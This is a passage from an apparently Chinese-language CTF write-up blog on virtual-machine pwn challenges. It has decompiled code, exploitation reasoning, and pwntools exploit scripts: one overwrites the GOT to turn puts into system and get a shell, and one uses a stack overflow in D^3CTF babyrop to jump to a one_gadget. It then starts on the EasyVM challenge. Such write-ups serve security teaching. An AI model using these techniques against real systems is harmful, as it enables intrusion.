class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以看到，用户可以控制无限制的index。load可以从控制的index读取，save可以控制index</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><ol><li>修改模拟stack的位置到got表上。</li><li>push，将got上puts函数的地址的值放入data中</li><li>sub，将puts函数的地址改为system函数的地址</li><li>pop，将system函数的地址写回got表上puts的位置</li><li>program name设为’/bin/sh’，输出程序名的时候即可getshell</li></ol><p>push 将stack上第一个值放入data中，puts和system的偏移offset。<br>push 将stack上第二个值放入data中，got表中puts函数的位置。<br>push 将stack上第三个值（data段相对于模拟的stack的地址的偏移，因为堆上面是保存了模拟的stack的地址的）放入data中<br>save 将相对于模拟stack的偏移读出，再将got表位置读出，然后将模拟的stack的地址改为got表，现在模拟的stack就被改到got表上了<br>push 将模拟栈上的值写入data中，因为栈现在在got表上，所以会将puts的地址写到data上<br>sub 将puts和system的偏移读出，将puts的地址读出，做减法，再写回data上，此时data上就只有一个system的地址<br>pop 读出buffer上system的地址，写会模拟stack上，因为模拟stack现在在got表上，所以将puts的地址改为了system的地址<br>模拟stack上第四个值为9999是因为push是会检查栈是否为空。检查方式为读入模拟stack中数据时会有一个变量记录一共读入了多少个数据，每次push都会减1，所以我们只要多读入几个数据即可让这个变量不减为0。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># context.log_level = 'debug'</span>binary <span class="token operator">=</span> <span class="token string">'./pwn'</span>lib <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>lib<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'push push push save push sub pop'</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_puts'</span><span class="token punctuation">]</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%d %d -208 99999'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>offset<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="D-3CTF-babyrop"><a href="#D-3CTF-babyrop" class="headerlink" title="D^3CTF babyrop"></a>D^3CTF babyrop</h1><h2 id="查看文件-3"><a href="#查看文件-3" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/14.png"></div><h2 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>主函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/15.png"></div>先读入指令然后再进行解析<pre class="line-numbers language-c"><code class="language-c">__int64 __fastcall <span class="token function">ParseIns</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> __int64 a4<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  _QWORD <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-80h]</span>  _QWORD <span class="token operator">*</span><span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-78h]</span>  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-60h]</span>  <span class="token keyword">unsigned</span> __int64 v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+78h] [rbp-8h]</span>  v6 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>a3<span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a4<span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v7<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">// a3的值就是存放esp的地址,v7变量所在的栈地址就是esp</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// a3[2] = 10, 其代表的是栈内数据的个数</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a3 <span class="token operator">+</span> <span class="token number">0x50LL</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// a3[1] = esp+0x50</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">2</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>          <span class="token operator">*</span>a2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">8</span><span class="token punctuation">:</span>          <span class="token function">Push4Byte</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v6<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">++</span><span class="token operator">*</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// sub esp,8; mov [esp],number; number是4字节大小</span>          <span class="token operator">*</span>a2 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4LL</span><span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x12</span><span class="token punctuation">:</span>          <span class="token function">Push1Byte</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">++</span><span class="token operator">*</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// sub esp,8; mov [esp],number; number是1字节大小</span>          <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x15</span><span class="token punctuation">:</span>          <span class="token function">Push8Byte</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">++</span><span class="token operator">*</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// sub esp,8; mov [esp],number; number是8字节大小</span>          <span class="token operator">*</span>a2 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8LL</span><span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x21</span><span class="token punctuation">:</span>          <span class="token function">sub_BB9</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">// add [esp],[esp-8]; mov [esp-8],0</span>          <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x26</span><span class="token punctuation">:</span>          <span class="token function">Add1Byte</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">++</span><span class="token operator">*</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// add [esp],number; number是1byte</span>          <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x28</span><span class="token punctuation">:</span>          <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">AddEsp0x50</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v6<span class="token punctuation">,</span> v5<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// add esp,0x50; a[2]=a[2]-10</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x30</span><span class="token punctuation">:</span>          <span class="token function">Sub1Byte</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">++</span><span class="token operator">*</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// sub [esp],number; number是1byte</span>          <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x34</span><span class="token punctuation">:</span>          <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>          <span class="token function">DoSth</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">// mov [esp-8],[esp]; sub esp,8</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x38</span><span class="token punctuation">:</span>          <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>          <span class="token function">MovEspAdd8Zero</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// mov [esp+8],0</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x42</span><span class="token punctuation">:</span>          <span class="token function">sub_EDF</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">// mov [esp-8],2*([esp]&amp;0xffffff); sub esp,8</span>          <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x51</span><span class="token punctuation">:</span>          <span class="token function">AddEsp1</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">// add [esp],1</span>          <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x52</span><span class="token punctuation">:</span>          <span class="token function">SubEsp1</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">// sub [esp],1</span>          <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x56</span><span class="token punctuation">:</span>          <span class="token function">MovEspNumber</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">++</span><span class="token operator">*</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// mov [esp],number; number是4字节</span>          <span class="token operator">*</span>a2 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4LL</span><span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看看漏洞函数：</p><pre class="line-numbers language-c"><code class="language-c">__int64 __fastcall <span class="token function">sub_C26</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>a2 <span class="token operator">></span> <span class="token number">1LL</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x50LL</span><span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">// sub esp,0x50</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">// a[2] = a[2] - 10</span>  <span class="token operator">++</span><span class="token operator">*</span>a2<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检查a1[2]!=0&amp;&amp;*a2&gt;1便令栈顶减少0x50，可以通过这个函数来进行栈溢出操作。</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>我们首先执行这个函数，再利用push指令，此时a1[2]!=0，我们便可以再使用一次这个函数来使栈溢出。这个时候便可以看到libc地址了，我们算好one_gadget的偏移，利用mov和add指令是esp等于one_gadget，之后我们再使用mov [esp-8],[esp]; sub esp,8指令将ret地址改为esp中one_gadget的地址。</p><p>第一步：执行漏洞函数+push+一个漏洞函数</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/16.png"></div><p>我们看到esp已经在设置的ebp下面，已经栈溢出了，我们再看esp附近地址的内容：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/17.png"></div><p>发现有libc地址</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/18.png"></div><p>parsefunc执行完的返回地址就在当前溢出的esp地址的附近</p><p>第二步：利用mov [esp],number；mov [esp-8],[esp]；add [esp],[esp-8]指令，构造出esp = one_gadget</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/19.png"></div><p>第三步：利用mov [esp-8],[esp],构造返回地址等于one_gedget</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/20.png"></div><p>注意无法getshell的原因是要求</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/21.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/22.png"></div>不满足条件，我们必须提前设置该地方的值为0，用mov [esp+8],0这条指令<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyrop'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#r = remote('')</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux','split','-h']</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>payload <span class="token operator">=</span> chr<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0x15</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># add esp,0x50; a[2]=a[2]-10</span>payload<span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span>                              <span class="token comment" spellcheck="true"># mov [esp+8],0</span>payload<span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x34</span><span class="token punctuation">)</span>                              <span class="token comment" spellcheck="true"># mov [esp-8],[esp]</span>payload<span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x56</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x24A3A</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true"># mov [esp],number</span>payload<span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>                              <span class="token comment" spellcheck="true"># add [esp],[esp-8], [esp]= one_gagget addr</span>payload<span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x34</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2020-高校战“疫”网络安全分享赛-EasyVM"><a href="#2020-高校战“疫”网络安全分享赛-EasyVM" class="headerlink" title="2020 高校战“疫”网络安全分享赛-EasyVM"></a>2020 高校战“疫”网络安全分享赛-EasyVM</h1><h2 id="查看文件-4"><a href="#查看文件-4" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/23.png"></div><h2 id="IDA分析-3"><a href="#IDA分析-3" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>主函数</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST2C_4</span>  _DWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-18h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+ACh] [ebp+7Ch]</span>  <span class="token function">init_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ptr <span class="token operator">=</span> <span class="token function">chunk_addr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                                   <span class="token comment" spellcheck="true">// add</span>        buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x300u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x2FFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 输入指令</span>        ptr<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">// 指令写到ptr[8]的位置</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr <span class="token punctuation">)</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">execute_code</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">// 实际上是针对写入的指令执行相关操作</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr <span class="token punctuation">)</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">// UAF??</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Maybe a bug is a gif?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        some_gift_305c <span class="token operator">=</span> v5<span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 通过调试发现，这里是指令地址</span>        ptr<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>unk_3020<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Zzzzzz........"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Are you kidding me ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" 